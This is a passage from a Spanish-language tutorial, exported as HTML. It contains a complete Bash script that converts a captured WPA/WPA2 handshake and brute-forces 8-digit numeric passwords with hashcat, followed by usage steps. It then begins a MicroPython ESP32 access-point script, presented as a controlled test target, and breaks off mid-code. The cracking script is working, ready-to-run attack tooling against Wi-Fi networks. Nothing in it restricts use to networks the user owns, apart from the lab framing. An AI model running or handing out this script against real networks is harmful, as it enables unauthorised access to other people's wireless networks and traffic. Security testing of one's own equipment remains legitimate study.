lst-kix_gaj9wbdj7miw-0" start="5"><li class="c4 c14 c8 li-bullet-0"><span class="c7 c11"></span></li><li class="c4 c14 li-bullet-0"><span class="c11 c21">Mostrar Resultado:</span><span class="c11">&nbsp;Una vez </span><span class="c11">que</span><span class="c11">&nbsp;Hashcat termina (ya sea encontrando la password o probando todas las combinaciones), el script usa </span><span class="c13">hashcat --show</span><span class="c7 c11">&nbsp;para ver si se encontr&oacute; una password para el handshake procesado.</span></li><li class="c4 c14 li-bullet-0"><span class="c11 c21">Limpieza:</span><span class="c11">&nbsp;Si la variable </span><span class="c13">CLEANUP</span><span class="c11">&nbsp;est&aacute; en </span><span class="c13">true</span><span class="c11">, elimina los archivos temporales generados por Hashcat (</span><span class="c13">.hc22000</span><span class="c11">, </span><span class="c13">hashcat.potfile</span><span class="c11">&nbsp;- donde se guardan las passwords encontradas, y </span><span class="c13">hashcat.restore</span><span class="c7 c11">).</span></li><li class="c4 c14 li-bullet-0"><span class="c11 c21">Mensaje Final:</span><span class="c7 c11">&nbsp;Informa que el proceso ha terminado y d&oacute;nde se guard&oacute; el archivo de log.</span></li></ol><p class="c16"><span class="c20 c11">El Script Bash:</span></p><p class="c16 c8"><span class="c11 c20"></span></p><p class="c25 c8"><span class="c7 c24"></span></p><p class="c16 c8"><span class="c20 c11"></span></p><p class="c2"><span class="c6">#!/bin/bash</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c9"># =========================</span></p><p class="c2"><span class="c9"># CONFIGURACI&Oacute;N</span></p><p class="c2"><span class="c9"># =========================</span></p><p class="c2"><span class="c1">LOGFILE=</span><span class="c5">&quot;wpa_crack_</span><span class="c15">$(date +%F_%H-%M-%S)</span><span class="c5">.log&quot;</span></p><p class="c2"><span class="c1">CLEANUP=</span><span class="c6">true</span><span class="c1">&nbsp; </span><span class="c9"># Cambia a false si no quieres borrar los archivos temporales</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c9"># =========================</span></p><p class="c2"><span class="c9"># FUNCIONES</span></p><p class="c2"><span class="c9"># =========================</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c9"># Funci&oacute;n para loguear en consola y archivo</span></p><p class="c2"><span class="c3">function</span><span class="c1">&nbsp;</span><span class="c12">log</span><span class="c0">() {</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c10">echo</span><span class="c1">&nbsp;-e </span><span class="c5">&quot;</span><span class="c6">$1</span><span class="c5">&quot;</span><span class="c1">&nbsp;| tee -a </span><span class="c5">&quot;</span><span class="c6">$LOGFILE</span><span class="c5">&quot;</span></p><p class="c2"><span class="c0">}</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c9"># =========================</span></p><p class="c2"><span class="c9"># INICIO DEL SCRIPT</span></p><p class="c2"><span class="c9"># =========================</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c10">log</span><span class="c1">&nbsp;</span><span class="c5">&quot;[*] Iniciando script de cracking WPA (8 d&iacute;gitos num&eacute;ricos).&quot;</span></p><p class="c2"><span class="c10">log</span><span class="c1">&nbsp;</span><span class="c5">&quot;[*] Archivo de log: </span><span class="c6">$LOGFILE</span><span class="c5">&quot;</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c9"># 1. Verificar argumento</span></p><p class="c2"><span class="c3">if</span><span class="c1">&nbsp;[ -z </span><span class="c5">&quot;</span><span class="c6">$1</span><span class="c5">&quot;</span><span class="c1">&nbsp;]; </span><span class="c3">then</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c10">log</span><span class="c1">&nbsp;</span><span class="c5">&quot;[!] Uso: </span><span class="c6">$0</span><span class="c5">&nbsp;archivo.cap&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c10">log</span><span class="c1">&nbsp;</span><span class="c5">&quot;[!] Se requiere un archivo de captura WPA (.cap o .pcapng).&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c10">exit</span><span class="c0">&nbsp;1</span></p><p class="c2"><span class="c3">fi</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">CAPFILE=</span><span class="c5">&quot;</span><span class="c6">$1</span><span class="c5">&quot;</span></p><p class="c2"><span class="c9"># Verificar si el archivo tiene extensi&oacute;n .cap o .pcapng</span></p><p class="c2"><span class="c3">if</span><span class="c1">&nbsp;[[ ! </span><span class="c5">&quot;</span><span class="c6">$CAPFILE</span><span class="c5">&quot;</span><span class="c1">&nbsp;=~ \.(</span><span class="c10">cap</span><span class="c1">|pcapng)$ ]]; </span><span class="c3">then</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c10">log</span><span class="c1">&nbsp;</span><span class="c5">&quot;[!] Error: El archivo &#39;</span><span class="c6">$CAPFILE</span><span class="c5">&#39; no parece ser un archivo .cap o .pcapng.&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c10">exit</span><span class="c0">&nbsp;1</span></p><p class="c2"><span class="c3">fi</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c3">if</span><span class="c1">&nbsp;[ ! -f </span><span class="c5">&quot;</span><span class="c6">$CAPFILE</span><span class="c5">&quot;</span><span class="c1">&nbsp;]; </span><span class="c3">then</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c10">log</span><span class="c1">&nbsp;</span><span class="c5">&quot;[!] Error: El archivo &#39;</span><span class="c6">$CAPFILE</span><span class="c5">&#39; no existe.&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c10">exit</span><span class="c0">&nbsp;1</span></p><p class="c2"><span class="c3">fi</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">BASENAME=$(basename </span><span class="c5">&quot;</span><span class="c6">$CAPFILE</span><span class="c5">&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c9"># Eliminar extensiones .cap o .pcapng para el nombre base</span></p><p class="c2"><span class="c1">BASENAME=</span><span class="c5">&quot;</span><span class="c6">${BASENAME%.cap}</span><span class="c5">&quot;</span></p><p class="c2"><span class="c1">BASENAME=</span><span class="c5">&quot;</span><span class="c6">${BASENAME%.pcapng}</span><span class="c5">&quot;</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">HC22000FILE=</span><span class="c5">&quot;</span><span class="c6">${BASENAME}</span><span class="c5">.hc22000&quot;</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c9"># 2. Convertir .cap a .hc22000</span></p><p class="c2"><span class="c10">log</span><span class="c1">&nbsp;</span><span class="c5">&quot;[*] Convirtiendo </span><span class="c6">$CAPFILE</span><span class="c5">&nbsp;a </span><span class="c6">$HC22000FILE</span><span class="c5">&nbsp;(modo 22000 para Hashcat)...&quot;</span></p><p class="c2"><span class="c9"># Verificar si hcxpcapngtool est&aacute; instalado</span></p><p class="c2"><span class="c3">if</span><span class="c1">&nbsp;! </span><span class="c10">command</span><span class="c1">&nbsp;-v hcxpcapngtool &amp;&gt; /dev/null; </span><span class="c3">then</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c10">log</span><span class="c1">&nbsp;</span><span class="c5">&quot;[!] Error: hcxpcapngtool no encontrado. Por favor, inst&aacute;lalo.&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c10">exit</span><span class="c0">&nbsp;1</span></p><p class="c2"><span class="c3">fi</span></p><p class="c2"><span class="c1">hcxpcapngtool -o </span><span class="c5">&quot;</span><span class="c6">$HC22000FILE</span><span class="c5">&quot;</span><span class="c1">&nbsp;</span><span class="c5">&quot;</span><span class="c6">$CAPFILE</span><span class="c5">&quot;</span><span class="c1">&nbsp;&gt;&gt; </span><span class="c5">&quot;</span><span class="c6">$LOGFILE</span><span class="c5">&quot;</span><span class="c0">&nbsp;2&gt;&amp;1</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c3">if</span><span class="c1">&nbsp;[ ! -f </span><span class="c5">&quot;</span><span class="c6">$HC22000FILE</span><span class="c5">&quot;</span><span class="c1">&nbsp;]; </span><span class="c3">then</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c10">log</span><span class="c1">&nbsp;</span><span class="c5">&quot;[!] Error: No se pudo generar el archivo .hc22000&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c10">log</span><span class="c1">&nbsp;</span><span class="c5">&quot;[!] Aseg&uacute;rate de que el archivo &#39;</span><span class="c6">$CAPFILE</span><span class="c5">&#39; contenga un handshake WPA/WPA2 v&aacute;lido.&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c10">exit</span><span class="c0">&nbsp;1</span></p><p class="c2"><span class="c3">fi</span></p><p class="c2"><span class="c10">log</span><span class="c1">&nbsp;</span><span class="c5">&quot;[*] Archivo .hc22000 generado exitosamente.&quot;</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c9"># 3. Ejecutar Hashcat con m&aacute;scara num&eacute;rica</span></p><p class="c2"><span class="c10">log</span><span class="c1">&nbsp;</span><span class="c5">&quot;[*] Iniciando ataque con Hashcat (modo 22000, 8 d&iacute;gitos num&eacute;ricos)...&quot;</span></p><p class="c2"><span class="c10">log</span><span class="c1">&nbsp;</span><span class="c5">&quot;[*] Comando: hashcat -m 22000 -a 3 \&quot;</span><span class="c6">$HC22000FILE</span><span class="c5">\&quot; ?d?d?d?d?d?d?d?d --status --status-timer=10 --force&quot;</span></p><p class="c2"><span class="c9"># Verificar si hashcat est&aacute; instalado</span></p><p class="c2"><span class="c3">if</span><span class="c1">&nbsp;! </span><span class="c10">command</span><span class="c1">&nbsp;-v hashcat &amp;&gt; /dev/null; </span><span class="c3">then</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c10">log</span><span class="c1">&nbsp;</span><span class="c5">&quot;[!] Error: hashcat no encontrado. Por favor, inst&aacute;lalo.&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c10">exit</span><span class="c0">&nbsp;1</span></p><p class="c2"><span class="c3">fi</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c9"># Ejecutar hashcat</span></p><p class="c2"><span class="c1">hashcat -m 22000 -a 3 </span><span class="c5">&quot;</span><span class="c6">$HC22000FILE</span><span class="c5">&quot;</span><span class="c1">&nbsp;?d?d?d?d?d?d?d?d --status --status-timer=10 --force &gt;&gt; </span><span class="c5">&quot;</span><span class="c6">$LOGFILE</span><span class="c5">&quot;</span><span class="c0">&nbsp;2&gt;&amp;1</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c9"># 4. Mostrar resultado si se encuentra</span></p><p class="c2"><span class="c10">log</span><span class="c1">&nbsp;</span><span class="c5">&quot;[*] Verificando si se encontr&oacute; la contrase&ntilde;a...&quot;</span></p><p class="c2"><span class="c9"># El comando --show puede generar errores si el archivo no existe, redirigimos stderr a /dev/null</span></p><p class="c2"><span class="c1">FOUND=$(hashcat -m 22000 </span><span class="c5">&quot;</span><span class="c6">$HC22000FILE</span><span class="c5">&quot;</span><span class="c0">&nbsp;--show 2&gt;/dev/null)</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c3">if</span><span class="c1">&nbsp;[ -n </span><span class="c5">&quot;</span><span class="c6">$FOUND</span><span class="c5">&quot;</span><span class="c1">&nbsp;]; </span><span class="c3">then</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c10">log</span><span class="c1">&nbsp;</span><span class="c5">&quot;\n[+] &iexcl;&iexcl;&iexcl;CONTRASE&Ntilde;A ENCONTRADA!!!&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c9"># hashcat --show output format is usually &quot;hash:password&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; PASSWORD=$(</span><span class="c10">echo</span><span class="c1">&nbsp;</span><span class="c5">&quot;</span><span class="c6">$FOUND</span><span class="c5">&quot;</span><span class="c1">&nbsp;| awk -F: </span><span class="c5">&#39;{print $NF}&#39;</span><span class="c1">) </span><span class="c9"># Extract password part</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c10">log</span><span class="c1">&nbsp;</span><span class="c5">&quot;[+] Red Encontrada / Password: </span><span class="c6">$FOUND</span><span class="c5">&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c10">log</span><span class="c1">&nbsp;</span><span class="c5">&quot;[+] Password extra&iacute;da: </span><span class="c6">$PASSWORD</span><span class="c5">&quot;</span></p><p class="c2"><span class="c3">else</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c10">log</span><span class="c1">&nbsp;</span><span class="c5">&quot;[!] Contrase&ntilde;a no encontrada despu&eacute;s de probar todas las combinaciones de 8 d&iacute;gitos.&quot;</span></p><p class="c2"><span class="c3">fi</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c9"># 5. Limpieza (opcional)</span></p><p class="c2"><span class="c3">if</span><span class="c1">&nbsp;[ </span><span class="c5">&quot;</span><span class="c6">$CLEANUP</span><span class="c5">&quot;</span><span class="c1">&nbsp;= </span><span class="c6">true</span><span class="c1">&nbsp;]; </span><span class="c3">then</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c10">log</span><span class="c1">&nbsp;</span><span class="c5">&quot;[*] Limpiando archivos temporales (.hc22000, hashcat.potfile, hashcat.restore)...&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; rm -f </span><span class="c5">&quot;</span><span class="c6">$HC22000FILE</span><span class="c5">&quot;</span><span class="c1">&nbsp;hashcat.potfile hashcat.restore &gt;&gt; </span><span class="c5">&quot;</span><span class="c6">$LOGFILE</span><span class="c5">&quot;</span><span class="c0">&nbsp;2&gt;&amp;1</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c10">log</span><span class="c1">&nbsp;</span><span class="c5">&quot;[*] Limpieza completa.&quot;</span></p><p class="c2"><span class="c3">else</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c10">log</span><span class="c1">&nbsp;</span><span class="c5">&quot;[*] La limpieza est&aacute; desactivada. Archivos temporales conservados.&quot;</span></p><p class="c2"><span class="c3">fi</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c10">log</span><span class="c1">&nbsp;</span><span class="c5">&quot;[*] Proceso finalizado. Revisa el archivo </span><span class="c6">$LOGFILE</span><span class="c5">&nbsp;para detalles completos.&quot;</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c0">exit 0</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c25 c8"><span class="c7 c24"></span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c20 c1">C&oacute;mo Usar el Script Bash:</span></p><p class="c2 c8"><span class="c0"></span></p><ol class="c23 lst-kix_ejnppnbgtp3g-0 start" start="1"><li class="c4 c14 li-bullet-0"><span class="c11">Guarda el c&oacute;digo anterior en un archivo, por ejemplo, </span><span class="c13">crack_wpa_8digit.sh</span><span class="c7 c11">.</span></li><li class="c4 c14 li-bullet-0"><span class="c11">Hazlo ejecutable: </span><span class="c13 c31">chmod +x crack_wpa_8digit.sh</span></li><li class="c4 c14 li-bullet-0"><span class="c11">Aseg&uacute;rate de tener un archivo de captura de handshake (</span><span class="c13">.cap</span><span class="c11">&nbsp;o </span><span class="c13">.pcapng</span><span class="c7 c11">) de la red que quieres probar.</span></li><li class="c4 c14 li-bullet-0"><span class="c7 c11">&nbsp;Ejecuta el script pasando el archivo de captura como argumento:</span></li></ol><p class="c4"><span class="c7 c11">./crack_wpa_8digit.sh tu_archivo_captura.cap</span></p><ol class="c23 lst-kix_ejnppnbgtp3g-0" start="5"><li class="c4 c14 li-bullet-0"><span class="c11">Observa la salida en la terminal y el archivo de log (</span><span class="c13">wpa_crack_YYYY-MM-DD_HH-MM-SS.log</span><span class="c7 c11">) para ver el progreso y el resultado.</span></li></ol><h2 class="c18" id="h.8965aga9ljlw"><span class="c7 c17">Parte 3: Script MicroPython para Entorno de Prueba Configurable</span></h2><p class="c16"><span class="c11">Este script de MicroPython para ESP32 crea un punto de acceso WiFi (</span><span class="c13">MiESP32AP</span><span class="c11">&nbsp;con password por defecto </span><span class="c13">12345678</span><span class="c11">), levanta un servidor web simple en </span><span class="c13">http://192.168.4.1/</span><span class="c7 c11">&nbsp;que permite al usuario cambiar la password del AP a trav&eacute;s de un formulario web. La nueva password se guarda en un archivo en el sistema de ficheros y el dispositivo se reinicia para aplicar el cambio de forma segura.</span></p><p class="c16"><span class="c11">Este script es &uacute;til como </span><span class="c11 c21">entorno de prueba controlado</span><span class="c11">. Puedes cargar este script en un ESP32, conectarte a su red, cambiar la password a una de 8 d&iacute;gitos num&eacute;ricos </span><span class="c11 c26">que t&uacute; conozcas</span><span class="c7 c11">, luego capturar el handshake de ese ESP32 y usar el script Bash de la Parte 2 para ver si es capaz de crackear la password que acabas de establecer manualmente.</span></p><p class="c16"><span class="c20 c11">Caracter&iacute;sticas Clave del Script MicroPython:</span></p><ul class="c23 lst-kix_u965x3awd42f-0 start"><li class="c4 c14 li-bullet-0"><span class="c7 c11">Configura el ESP32 como un punto de acceso WiFi con SSID fijo y IP est&aacute;tica.</span></li><li class="c4 c14 li-bullet-0"><span class="c7 c11">Usa una password WPA por defecto al inicio.</span></li><li class="c4 c14 li-bullet-0"><span class="c11">Puede cargar una password guardada desde el archivo </span><span class="c13">ap_password.txt</span><span class="c7 c11">&nbsp;al iniciar (si no es un reinicio por encendido).</span></li><li class="c4 c14 li-bullet-0"><span class="c11">Si se reinicia por encendido (</span><span class="c13">machine.PWRON_RESET</span><span class="c11">), borra </span><span class="c13">ap_password.txt</span><span class="c7 c11">&nbsp;para volver a la password por defecto (&uacute;til para &quot;resetear&quot; la configuraci&oacute;n de password).</span></li><li class="c4 c14 li-bullet-0"><span class="c7 c11">Sirve una p&aacute;gina web sencilla con un formulario para introducir una nueva password.</span></li><li class="c4 c14 li-bullet-0"><span class="c7 c11">Maneja la recepci&oacute;n de la nueva password por HTTP POST.</span></li><li class="c4 c14 li-bullet-0"><span class="c7 c11">Valida que la nueva password tenga al menos 8 caracteres.</span></li><li class="c4 c14 li-bullet-0"><span class="c11">Guarda la password v&aacute;lida en </span><span class="c13">ap_password.txt</span><span class="c7 c11">&nbsp;y sincroniza el sistema de ficheros.</span></li><li class="c4 c14 li-bullet-0"><span class="c7 c11">Env&iacute;a una p&aacute;gina HTML de cuenta atr&aacute;s al navegador, mostrando la nueva password (con advertencia de seguridad) antes de reiniciar.</span></li><li class="c4 c14 li-bullet-0"><span class="c11">Reinicia el ESP32 (</span><span class="c13">machine.reset()</span><span class="c7 c11">) para aplicar la nueva password del AP desde cero.</span></li><li class="c4 c14 li-bullet-0"><span class="c7 c11">Incluye mensajes de debug en la consola serial para seguir la ejecuci&oacute;n.</span></li></ul><p class="c16"><span class="c20 c11">El Script MicroPython:</span></p><p class="c8 c25"><span class="c7 c24"></span></p><p class="c2"><span class="c3">import</span><span class="c0">&nbsp;network</span></p><p class="c2"><span class="c3">import</span><span class="c0">&nbsp;socket</span></p><p class="c2"><span class="c3">import</span><span class="c0">&nbsp;time</span></p><p class="c2"><span class="c9"># import ure &nbsp;# Ya no necesitamos ure si solo usamos string.split</span></p><p class="c2"><span class="c3">import</span><span class="c0">&nbsp;machine</span></p><p class="c2"><span class="c3">import</span><span class="c1">&nbsp;uos </span><span class="c9"># Para interactuar con el sistema de archivos</span></p><p class="c2"><span class="c3">import</span><span class="c1">&nbsp;sys </span><span class="c9"># Para acceder a sys.exit en caso de error fatal</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c9"># Configuraci&oacute;n del punto de acceso</span></p><p class="c2"><span class="c1">AP_SSID = </span><span class="c5">&quot;MiESP32AP&quot;</span><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c9"># Nombre de la red WiFi</span></p><p class="c2"><span class="c1">AP_IP = </span><span class="c5">&quot;192.168.4.1&quot;</span><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c9"># Direcci&oacute;n IP del punto de acceso</span></p><p class="c2"><span class="c1">AP_SUBNET = </span><span class="c5">&quot;255.255.255.0&quot;</span><span class="c1">&nbsp; &nbsp;</span><span class="c9"># M&aacute;scara de subred</span></p><p class="c2"><span class="c1">AP_GATEWAY = </span><span class="c5">&quot;192.168.4.1&quot;</span><span class="c1">&nbsp; &nbsp; </span><span class="c9"># Gateway (misma IP del AP)</span></p><p class="c2"><span class="c1">AP_DNS = </span><span class="c5">&quot;8.8.8.8&quot;</span><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c9"># Servidor DNS</span></p><p class="c2"><span class="c1">DEFAULT_AP_PASSWORD = </span><span class="c5">&quot;12345678&quot;</span><span class="c1">&nbsp;</span><span class="c9"># Default WPA password</span></p><p class="c2"><span class="c1">PASSWORD_FILE = </span><span class="c5">&quot;ap_password.txt&quot;</span><span class="c1">&nbsp;</span><span class="c9"># File to store the password</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c9"># Almacenar&aacute; la password actual</span></p><p class="c2"><span class="c0">current_ap_password = DEFAULT_AP_PASSWORD</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c9"># Crear el objeto AP</span></p><p class="c2"><span class="c0">ap = network.WLAN(network.AP_IF)</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c3">def</span><span class="c1">&nbsp;</span><span class="c12">load_password</span><span class="c0">():</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c5">&quot;&quot;&quot;Loads the password from file, or uses default. Deletes file if invalid.&quot;&quot;&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c3">global</span><span class="c0">&nbsp;current_ap_password</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; print(</span><span class="c5">&quot;Loading password from file...&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c3">try</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">with</span><span class="c1">&nbsp;</span><span class="c10">open</span><span class="c1">(PASSWORD_FILE, </span><span class="c5">&#39;r&#39;</span><span class="c1">) </span><span class="c3">as</span><span class="c0">&nbsp;f:</span></p><p class="c2"><span class="c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; loaded_password = f.read().strip()</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">if</span><span class="c1">&nbsp;</span><span class="c10">len</span><span class="c1">(loaded_password) &gt;= </span><span class="c6">8</span><span class="c1">: </span><span class="c9"># Basic validation for loaded password</span></p><p class="c2"><span class="c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;current_ap_password = loaded_password</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;print(</span><span class="c5">f&quot;Loaded password from file: </span><span class="c15">{current_ap_password}</span><span class="c5">&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">else</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c9"># File exists, but password is invalid</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;print(</span><span class="c5">f&quot;Password in &#39;</span><span class="c15">{PASSWORD_FILE}</span><span class="c5">&#39; is too short (</span><span class="c15">{</span><span class="c10">len</span><span class="c15">(loaded_password)}</span><span class="c5">&nbsp;chars). Deleting file and using default.&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;current_ap_password = DEFAULT_AP_PASSWORD</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c3">try</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;uos.remove(PASSWORD_FILE) </span><span class="c9"># Delete the invalid file</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;print(</span><span class="c5">f&quot;Deleted invalid password file: &#39;</span><span class="c15">{PASSWORD_FILE}</span><span class="c5">&#39;.&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c3">except</span><span class="c0">&nbsp;OSError:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;print(</span><span class="c5">f&quot;Error deleting invalid password file: &#39;</span><span class="c15">{PASSWORD_FILE}</span><span class="c5">&#39;.&quot;</span><span class="c0">)</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c3">except</span><span class="c1">&nbsp;OSError: </span><span class="c9"># This catches FileNotFoundError if the file doesn&#39;t exist</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">f&quot;&#39;</span><span class="c15">{PASSWORD_FILE}</span><span class="c5">&#39; not found. Using default password.&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c0">&nbsp; &nbsp; &nbsp; &nbsp; current_ap_password = DEFAULT_AP_PASSWORD</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c3">except</span><span class="c1">&nbsp;Exception </span><span class="c3">as</span><span class="c1">&nbsp;e: </span><span class="c9"># Catch any other error during file reading</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; print(</span><span class="c5">f&quot;Unexpected error loading password from file: </span><span class="c15">{e}</span><span class="c5">. Deleting file and using default.&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; current_ap_password = DEFAULT_AP_PASSWORD </span><span class="c9"># Fallback to default</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">try</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;uos.remove(PASSWORD_FILE) </span><span class="c9"># Attempt to remove the problematic file</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;print(</span><span class="c5">f&quot;Removed potentially corrupted &#39;</span><span class="c15">{PASSWORD_FILE}</span><span class="c5">&#39;.&quot;</span><span class="c0">)</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">except</span><span class="c0">&nbsp;OSError:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;print(</span><span class="c5">f&quot;Error deleting corrupted password file: &#39;</span><span class="c15">{PASSWORD_FILE}</span><span class="c5">&#39;.&quot;</span><span class="c0">)</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c9"># Optionally, save the password (either loaded or default) to the file</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c9"># if you always want the file to exist with the current active password</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c9"># print(f&quot;Ensuring &#39;{PASSWORD_FILE}&#39; exists with current password...&quot;) # Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c9"># save_password(current_ap_password) # Uncomment this line if you want to always save the password after loading</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c3">return</span><span class="c0">&nbsp;current_ap_password</span></p><p class="c2 c8"><span class="c0"></span></p><p class="c2"><span class="c3">def</span><span class="c1">&nbsp;</span><span class="c12">save_password</span><span class="c0">(password):</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c5">&quot;&quot;&quot;Saves the new password to file and syncs.&quot;&quot;&quot;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; print(</span><span class="c5">f&quot;Saving password to &#39;</span><span class="c15">{PASSWORD_FILE}</span><span class="c5">&#39;...&quot;</span><span class="c1">) </span><span class="c9"># Debug print</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; </span><span class="c3">try</span><span class="c0">:</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3">with</span><span class="c1">&nbsp;</span><span class="c10">open</span><span 